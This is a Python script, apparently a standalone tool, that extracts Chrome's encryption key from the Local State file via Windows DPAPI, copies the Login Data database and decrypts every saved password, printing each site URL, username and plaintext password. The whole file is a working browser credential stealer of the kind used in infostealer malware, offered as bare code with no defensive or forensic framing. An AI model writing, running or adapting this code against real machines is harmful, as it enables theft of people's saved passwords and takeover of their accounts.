import os
import binascii
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


class GoogleKeyRetriever:

    def __init__(self):
        self.key = self.fetching_encryption_key()
        self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "default", "Login Data")
        self.filename = "ChromePasswords.db"
        shutil.copyfile(self.db_path, self.filename)

    @staticmethod
    def chrome_date_and_time(chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key(self):
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google",
            "Chrome", "User Data", "Local State")

        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    @staticmethod
    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def retrievekeys(self):
        db = sqlite3.connect(self.filename)
        cursor = db.cursor()

        data = ""

        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = self.password_decryption(row[3], self.key)
            date_of_creation = row[4]
            last_usage = row[5]

            if user_name or decrypted_password:
                data += f"--> Main URL: {main_url}\n"
                if login_page_url:
                    data += f"    Login URL: {login_page_url}\n"
                data += f"    User name: {user_name}\n"
                data += f"    Password: {decrypted_password}\n"

            if last_usage != 86400000000 and last_usage:
                data += f"    Last Used: {str(self.chrome_date_and_time(last_usage))}\n"

            data += "\n"

        cursor.close()
        db.close()

        try:
            os.remove(self.filename)
        except:
            pass

        return data

if __name__ == "__main__":
    results = GoogleKeyRetriever().retrievekeys()
    print(results)